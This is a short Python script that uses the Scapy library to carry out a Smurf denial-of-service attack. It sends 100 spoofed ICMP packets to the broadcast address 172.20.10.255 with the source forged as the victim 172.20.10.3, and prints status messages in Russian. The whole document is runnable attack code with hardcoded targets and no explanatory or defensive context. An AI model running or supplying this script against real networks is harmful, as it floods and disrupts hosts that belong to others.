import time
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send

PACKETS_COUNTER = 100
DELAY = 0.01


def smurf_attack(victim_ip, broadcast_ip):
    packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()

    for i in range(PACKETS_COUNTER):
        send(packet, verbose=0)

        print(f"Смурф-атака на {victim_ip} через {broadcast_ip}")

        time.sleep(DELAY)

    print(f"Отправлено {PACKETS_COUNTER} пакетов.")


broadcast_ip = "172.20.10.255"
victim_ip = "172.20.10.3"

smurf_attack(victim_ip, broadcast_ip)
